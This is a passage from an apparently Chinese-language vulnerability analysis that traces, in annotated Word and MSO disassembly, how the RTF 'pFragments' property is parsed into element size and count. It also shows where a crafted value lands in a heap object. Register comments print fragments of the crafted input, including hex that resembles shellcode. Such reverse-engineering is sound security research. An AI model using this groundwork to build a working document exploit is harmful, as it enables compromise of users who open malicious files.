class="keyword">int</span> a1)</span><br><span class="line"></span><br><span class="line">    ******************************************</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3C6                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                          <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3C7                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                     <span class="comment">;   ebp = esp = 0x0011B1EC</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3C9                 <span class="keyword">push</span>    <span class="built_in">esi</span>                          <span class="comment">;   esi = 0x023B0002</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3CA                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]                  <span class="comment">; arg1: [ebp+8] = [0x0011B1EC+8] = [0x0011B1F4] = 0x023B0000(a1)(pFragments属性值)</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3CD                 <span class="keyword">xor</span>     <span class="built_in">esi</span>, <span class="built_in">esi</span>                     <span class="comment">;   esi = esi^esi = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3CF                 <span class="keyword">call</span>    sub_3203D37F                 <span class="comment">;   去除'\t'和' ', &lt;---- </span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">        ************************************************</span><br><span class="line"></span><br><span class="line">            所属模块: wwlib.dll</span><br><span class="line">            _<span class="built_in">BYTE</span> *__stdcall sub_3203D37F(_<span class="built_in">BYTE</span> *a1)</span><br><span class="line"></span><br><span class="line">        ************************************************</span><br><span class="line"><span class="symbol">        .text:</span>3203D37F                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1EC</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D380                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011B1DC</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D382                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_0]         <span class="comment">;   eax = [ebp+8] = [0x0011B1E4] = 0x023B0000(a1)(pFragments属性值)</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D385 loc_3203D385:                           </span><br><span class="line"><span class="symbol">        .text:</span>3203D385                 <span class="keyword">mov</span>     <span class="built_in">cl</span>, [<span class="built_in">eax</span>]                <span class="comment">;   cl = [eax] = [023B0000] = 0x36 ('6')</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D387                 <span class="keyword">cmp</span>     <span class="built_in">cl</span>, <span class="number">9</span>                    <span class="comment">;   cl = 0x36,0x9='\t'</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D38A                 <span class="keyword">jz</span>      loc_31602C3A             <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D390                 <span class="keyword">cmp</span>     <span class="built_in">cl</span>, <span class="number">20h</span>                  <span class="comment">;   cl = 0x36,0x20=' '</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D393                 <span class="keyword">jz</span>      loc_31602C3A             <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D399                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1EC</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D39A                 <span class="keyword">retn</span>    <span class="number">4</span>                        <span class="comment">;</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4 loc_31BAF3D4:                           </span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4                 <span class="keyword">mov</span>     <span class="built_in">cl</span>, [<span class="built_in">eax</span>]                    <span class="comment">;   cl = [eax] = [023B0000] = 0x36 ('6')</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D6                 <span class="keyword">cmp</span>     <span class="built_in">cl</span>, <span class="number">30h</span>                      <span class="comment">;   cl = 0x36,0x30='0' &lt;---- 应大于等于0</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D9                 <span class="keyword">jnb</span>     short loc_31BAF3B4           <span class="comment">;   不小于跳转，这里跳转</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3B4 loc_31BAF3B4:                           </span><br><span class="line"><span class="symbol">    .text:</span>31BAF3B4                 <span class="keyword">inc</span>     <span class="built_in">eax</span>                          <span class="comment">;   eax = 0x023B0001</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3B5                 <span class="keyword">cmp</span>     <span class="built_in">cl</span>, <span class="number">39h</span>                      <span class="comment">;   cl = 0x36,0x39='9' &lt;---- 应小于9</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3B8                 <span class="keyword">ja</span>      short loc_31BAF3DB           <span class="comment">;   大于跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3BA                 <span class="keyword">imul</span>    <span class="built_in">esi</span>, <span class="number">0Ah</span>                     <span class="comment">;   esi = esi*0xA = 0x0*0xA = 0x0 &lt;---- 乘10，代表el_size和el_count都是用10进制数表示的</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3BD                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">cl</span>                      <span class="comment">;   ecx = 0x00000036</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3C0                 <span class="keyword">lea</span>     <span class="built_in">esi</span>, [<span class="built_in">esi</span>+<span class="built_in">ecx</span>-<span class="number">30h</span>]           <span class="comment">;   esi = esi+ecx-0x30 = 6 &lt;---- ASCII值转化为整型</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3C4                 <span class="keyword">jmp</span>     short loc_31BAF3D4           <span class="comment">; </span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4 loc_31BAF3D4:                           </span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4                 <span class="keyword">mov</span>     <span class="built_in">cl</span>, [<span class="built_in">eax</span>]                    <span class="comment">;   cl = [eax] = [0x023B0001] = 0x00</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D6                 <span class="keyword">cmp</span>     <span class="built_in">cl</span>, <span class="number">30h</span>                      <span class="comment">;   cl = 0x00,0x30='0'</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D9                 <span class="keyword">jnb</span>     short loc_31BAF3B4           <span class="comment">;   不小于跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3DB loc_31BAF3DB:                           </span><br><span class="line"><span class="symbol">    .text:</span>31BAF3DB                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                     <span class="comment">;   eax = esi = 0x6 &lt;---- 返回值(pFragments的属性数组参数整型值)</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3DD                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                          <span class="comment">;   esi = 0x023B0002</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3DE                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                          <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3DF                 <span class="keyword">retn</span>    <span class="number">4</span>                            <span class="comment">; </span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>319C0573                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">eax</span>                     <span class="comment">;   edi = eax = 0x6 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">.text:</span>319C0575                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                     <span class="comment">;   eax = esi = 0x023B0002</span></span><br><span class="line"><span class="symbol">.text:</span>319C0577</span><br><span class="line"><span class="symbol">.text:</span>319C0577 loc_319C0577:                          </span><br><span class="line"><span class="symbol">.text:</span>319C0577                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>], <span class="number">0</span>            <span class="comment">;   [esi] = [0x023B0002] = 0x35('5') &lt;----</span></span><br><span class="line"><span class="symbol">.text:</span>319C057A                 <span class="keyword">jnz</span>     loc_31E269F1                 <span class="comment">;   不为0，则跳转，这里跳转</span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>31E269F1                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>], <span class="number">3Bh</span>          <span class="comment">;   [esi] = [0x023B0002] = 0x35('5'),0x3B=';' &lt;---- 截取参数</span></span><br><span class="line"><span class="symbol">.text:</span>31E269F4                 <span class="keyword">jz</span>      short loc_31E269FC           <span class="comment">;   为0，则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>31E269F6                 <span class="keyword">inc</span>     <span class="built_in">esi</span>                          <span class="comment">;   esi = esi+1 = 0x023B0003</span></span><br><span class="line"><span class="symbol">.text:</span>31E269F7                 <span class="keyword">jmp</span>     loc_319C0577                 <span class="comment">; </span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>31E269FC                 <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>], <span class="number">0</span>            <span class="comment">;   [esi] = [0x023B0003] = 0x00</span></span><br><span class="line"><span class="symbol">.text:</span>31E269FF                 <span class="keyword">inc</span>     <span class="built_in">esi</span>                          <span class="comment">;   esi = esi+1 = 0x023B0004</span></span><br><span class="line"><span class="symbol">.text:</span>31E26A00                 <span class="keyword">jmp</span>     loc_319C0580                 <span class="comment">; </span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>319C0580 loc_319C0580:                           </span><br><span class="line"><span class="symbol">.text:</span>319C0580                 <span class="keyword">push</span>    <span class="built_in">eax</span>                          <span class="comment">;   eax = 0x023B0002</span></span><br><span class="line"><span class="symbol">.text:</span>319C0581                 <span class="keyword">call</span>    sub_31BAF3C6                 <span class="comment">;   判断pFragments的属性数组参数是否合法，合法则由字符转为整型</span></span><br><span class="line"><span class="symbol">.text:</span>319C0586                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+ppstm], <span class="built_in">eax</span>             <span class="comment">;   [ebp-4] = [0x0011B268-4] = [0x0011B264] = eax = 0x5 &lt;---- el_count</span></span><br><span class="line"><span class="symbol">.text:</span>319C0589                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]             <span class="comment">;   eax = ebp-0x8 = 0x0011B268-8 = 0x0011B260</span></span><br><span class="line"><span class="symbol">.text:</span>319C058C                 <span class="keyword">push</span>    <span class="built_in">eax</span>                          <span class="comment">; arg2: eax = 0x0011B260</span></span><br><span class="line"><span class="symbol">.text:</span>319C058D                 <span class="keyword">push</span>    <span class="built_in">edi</span>                          <span class="comment">; arg1: edi = 0x6 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">.text:</span>319C058E                 <span class="keyword">call</span>    MSO_379                      <span class="comment">;   [32081B48] = 0x326ccb92 (wwlib.3167D1C7)</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    ************************************************************</span><br><span class="line"></span><br><span class="line">        所属模块: mso.dll</span><br><span class="line">        signed <span class="keyword">int</span> __stdcall MSO_379(__int16 a1, _<span class="built_in">DWORD</span> *a2)</span><br><span class="line"></span><br><span class="line">    ************************************************************</span><br><span class="line"><span class="symbol">    .text:</span>326CCB92                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB93                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB95                 <span class="keyword">push</span>    <span class="built_in">esi</span>                      <span class="comment">; arg2: esi = 0x023B0004 ASCII "11111111acc8d9e9bdbfaf3c99d97424f45b33c9b13183ebfc316b14036bab4dc9653b133296bb74ba738ab4d8f0bc04aa55"</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB96                 <span class="keyword">push</span>    <span class="number">18h</span>                      <span class="comment">; arg1: 0x18</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB98                 <span class="keyword">call</span>    _MsoPvAllocCore@<span class="number">4</span> <span class="comment">; MsoPvAllocCore(x)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB9D                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                 <span class="comment">;   eax = 0x05D755C8,(UNICODE "Description")(关键对象首地址) &lt;---- 给关键对象分配内存</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB9F                 <span class="keyword">jz</span>      loc_32C9662C             <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBA5                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], mso.32A0C8C4 <span class="comment">; [eax] = [0x05D755C8] = 0x32A0C8C4(虚表指针) &lt;---- 关键对象的虚表指针</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBAB                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">eax</span>                 <span class="comment">;   esi = eax = 0x05D755C8(关键对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBAD</span><br><span class="line"><span class="symbol">    .text:</span>326CCBAD loc_326CCBAD:                          </span><br><span class="line"><span class="symbol">    .text:</span>326CCBAD                 <span class="keyword">test</span>    <span class="built_in">esi</span>, <span class="built_in">esi</span>                 <span class="comment">;   esi = 0x05D755C8(关键对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBAF                 <span class="keyword">jz</span>      loc_32C96633             <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBB5                 <span class="keyword">mov</span>     <span class="built_in">ax</span>, [<span class="built_in">ebp</span>+arg_0]          <span class="comment">;   ax = [ebp+8] = [0x0011B1E8+8] = [0x0011B1F0] = 0x0006(a1)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBB9                 <span class="keyword">push</span>    <span class="number">4</span>                        <span class="comment">; arg3: 4</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBBB                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">0Ch</span>], <span class="built_in">ax</span>            <span class="comment">;   [esi+0xc] = [0x05D755C8+0xc] = [0x05D755D4] = 0x0006 &lt;---- el_size保存到关键对象的第4个dword</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBBF                 <span class="keyword">push</span>    <span class="number">4</span>                        <span class="comment">; arg2: 4</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBC1                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>+<span class="number">4</span>]             <span class="comment">;   eax = esi+4 = 0x05D755C8+4 = 0x05D755CC</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBC4                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">; arg1: eax = 0x05D755CC</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBC5                 <span class="keyword">call</span>    MSO_501                  <span class="comment">; </span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">        ****************************************************************</span><br><span class="line"></span><br><span class="line">            所属模块: mso.dll</span><br><span class="line">            signed <span class="keyword">int</span> __stdcall MSO_501(<span class="keyword">int</span> a1, __int16 a2, <span class="keyword">int</span> a3)</span><br><span class="line"></span><br><span class="line">        ****************************************************************</span><br><span class="line"><span class="symbol">        .text:</span>326098B5                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">        .text:</span>326098B6                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011B1D0</span></span><br><span class="line"><span class="symbol">        .text:</span>326098B8                 <span class="keyword">push</span>    <span class="number">0</span>                        <span class="comment">; arg4: 0</span></span><br><span class="line"><span class="symbol">        .text:</span>326098BA                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_8]              <span class="comment">; arg3: [ebp+0x10] = [0x0011B1E0] = 0x00000004(a3)</span></span><br><span class="line"><span class="symbol">        .text:</span>326098BD                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]              <span class="comment">; arg2: [ebp+0xc] = [0x0011B1DC] = 0x00000004(a2)</span></span><br><span class="line"><span class="symbol">        .text:</span>326098C0                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]              <span class="comment">; arg1: [ebp+0x8] = [0x0011B1D8] = 0x05D755CC(a1)</span></span><br><span class="line"><span class="symbol">        .text:</span>326098C3                 <span class="keyword">call</span>    sub_32608E17             <span class="comment">; </span></span><br><span class="line">                |       |</span><br><span class="line">                ↓       ↓</span><br><span class="line">            *****************************************************************************</span><br><span class="line"></span><br><span class="line">                所属模块: mso.dll</span><br><span class="line">                signed <span class="keyword">int</span> __stdcall sub_32608E17(<span class="keyword">int</span> a1, __int16 a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span><br><span class="line"></span><br><span class="line">            *****************************************************************************</span><br><span class="line"><span class="symbol">            .text:</span>32608E17                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1D0</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E18                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011B1B8</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E1A                 <span class="keyword">push</span>    <span class="built_in">esi</span>                      <span class="comment">;   esi = 0x05D755C8(关键对象首地址)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E1B                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_0]         <span class="comment">;   esi = [ebp+0x8] = [0x0011B1C0] = 0x05D755CC(a1)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E1E                 <span class="keyword">push</span>    <span class="built_in">edi</span>                      <span class="comment">;   edi = 0x00000006 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E1F                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+arg_8]         <span class="comment">;   edi = [ebp+0x10] = [0x0011B1B8+0x10] = [0x0011B1C8] = 0x00000004(a3)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E22                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_0]         <span class="comment">;   eax = ebp+0x8 = 0x0011B1C0(a1地址)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E25                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">; arg3: eax = 0x0011B1C0(a1地址) </span></span><br><span class="line"><span class="symbol">            .text:</span>32608E26                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">8</span>]    <span class="comment">;   eax = [esi+8] = [0x05D755CC+8] = [0x05D755D4] = 0x00000006 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E2A                 <span class="keyword">push</span>    <span class="built_in">edi</span>                      <span class="comment">; arg2: edi = 0x00000004</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E2B                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">; arg1: eax = 0x00000006 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E2C                 <span class="keyword">call</span>    sub_32608E81</span><br><span class="line"><span class="symbol">            .text:</span>32608E31                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                 <span class="comment">;   eax = 0x00000001</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E33                 <span class="keyword">jz</span>      loc_32BD823F             <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E39                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_4]         <span class="comment">;   eax = [ebp+0xc] = [0x0011B1C4] = 0x00000004(a2)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E3C                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">8</span>]    <span class="comment">;   ecx = [esi+8] = [0x05D755CC+8] = [0x05D755D4] = 0x00000006 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E40                 <span class="keyword">and</span>     <span class="built_in">eax</span>, <span class="number">7FFFh</span>               <span class="comment">;   eax = eax&amp;0x7FFF = 0x00000004</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E45                 <span class="keyword">shl</span>     <span class="built_in">eax</span>, <span class="number">10h</span>                 <span class="comment">;   eax = eax&lt;&lt;0x10 = 0x00040000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E48                 <span class="keyword">or</span>      <span class="built_in">eax</span>, <span class="built_in">ecx</span>                 <span class="comment">;   eax = eax or ecx = 0x00040006</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E4A                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+arg_C]         <span class="comment">;   ecx = [ebp+0x14] = [0x0011B1CC] = 0x00000000(a4)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E4D                 <span class="keyword">xor</span>     <span class="built_in">edx</span>, <span class="built_in">edx</span>                 <span class="comment">;   edx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E4F                 <span class="keyword">cmp</span>     <span class="built_in">edi</span>, <span class="built_in">edx</span>                 <span class="comment">;   edi = 0x00000004</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E51                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">8</span>], <span class="built_in">eax</span>             <span class="comment">;   [esi+8] = [0x05D755CC+8] = [0x05D755D4] = eax = 0x00040006  &lt;---- 关键对象的第4个dword重新赋值</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E54                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>+<span class="number">0Ch</span>]           <span class="comment">;   eax = esi+0xc = 0x05D755CC+0xc = 0x05D755D8</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E57                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>], <span class="built_in">edx</span>               <span class="comment">;   [esi] = [0x05D755CC] = edx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E59                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">4</span>], <span class="built_in">edx</span>             <span class="comment">;   [esi+4] = [0x05D755D0] = edx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E5C                 <span class="keyword">mov</span>     [<span class="built_in">eax</span>], <span class="built_in">edx</span>               <span class="comment">;   [eax] = [0x05D755D8] = edx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E5E                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">10h</span>], <span class="built_in">ecx</span>           <span class="comment">;   [esi+0x10] = [0x05D755CC+0x10] = [0x05D755DC] = ecx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E61                 <span class="keyword">jbe</span>     short loc_32608E78       <span class="comment">;   不大于跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E63                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                      <span class="comment">;   ecx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E64                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">;   eax = 0x05D755D8</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E65                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]              <span class="comment">;   [ebp+8] = [0x0011B1B8+8] = [0x0011B1C0] = 0x18</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E68                 <span class="keyword">call</span>    MSO_234                  <span class="comment">; </span></span><br><span class="line"><span class="symbol">            .text:</span>32608E6D                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E6F                 <span class="keyword">jl</span>      loc_32BD823F </span><br><span class="line"><span class="symbol">            .text:</span>32608E75                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">4</span>], <span class="built_in">edi</span>             <span class="comment">;   [0x05D755CC+4] = [0x05D755D0] = 0x4</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E78</span><br><span class="line"><span class="symbol">            .text:</span>32608E78 loc_32608E78:                        </span><br><span class="line"><span class="symbol">            .text:</span>32608E78                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                 <span class="comment">;   eax = 0x0</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E7A                 <span class="keyword">inc</span>     <span class="built_in">eax</span>                      <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E7B</span><br><span class="line"><span class="symbol">            .text:</span>32608E7B loc_32608E7B:                          </span><br><span class="line"><span class="symbol">            .text:</span>32608E7B                 <span class="keyword">pop</span>     <span class="built_in">edi</span>                      <span class="comment">;   edi = 0x6</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E7C                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                      <span class="comment">;   esi = 0x05D755C8(关键对象首地址)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E7D                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1D0</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E7E                 <span class="keyword">retn</span>    <span class="number">10h</span></span><br><span class="line">                |       |</span><br><span class="line">                ↓       ↓</span><br><span class="line"><span class="symbol">        .text:</span>326098C8                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">        .text:</span>326098C9                 <span class="keyword">retn</span>    <span class="number">0Ch</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>326CCBCA                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                     <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBCC                 <span class="keyword">jz</span>      loc_32C9663A                 <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBD2                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_4]             <span class="comment">;   eax = [ebp+0xc] = [0x0011B1F4] = 0x0011B260(a2)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBD5                 <span class="keyword">mov</span>     [<span class="built_in">eax</span>], <span class="built_in">esi</span>                   <span class="comment">;   [eax] = [0x0011B260] = esi = 0x05D755C8(关键对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBD7                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                     <span class="comment">;   eax = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBD9                 <span class="keyword">inc</span>     <span class="built_in">eax</span>                          <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBDA</span><br><span class="line"><span class="symbol">    .text:</span>326CCBDA loc_326CCBDA:                         </span><br><span class="line"><span class="symbol">    .text:</span>326CCBDA                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                          <span class="comment">;   esi = 0x023B0004;(ASCII "11111111acc84161304161314161324161334161344161354161364161374161384161394162304162314162324162334162")</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBDB                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                          <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBDC                 <span class="keyword">retn</span>    <span class="number">8</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;通过仔细分析，我们可以发现，对<code>“pFragments”</code>属性数据的<code>处理逻辑</code>，都在<code>wwlib.dll</code>的<code>sub_31FD724E</code>函数中，但是分析了这么久，只找到了<code>“6;5;”</code>中的<code>“6”</code>和<code>“5”</code>，也就是<code>数组元素的大小</code>和<code>数组元素个数</code>都使用<code>10进制</code>表示的，未做其他判断。从前面rtf的文档中关于<code>“pFragments”</code>属性的介绍可以知道，<code>数组元素的大小</code>可以为<code>2、4或8</code>，这个并没有找到。我们通过IDA的<code>F5反编译</code>功能，查看<code>sub_31FD724E</code>的伪代码，或许会发现点什么：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 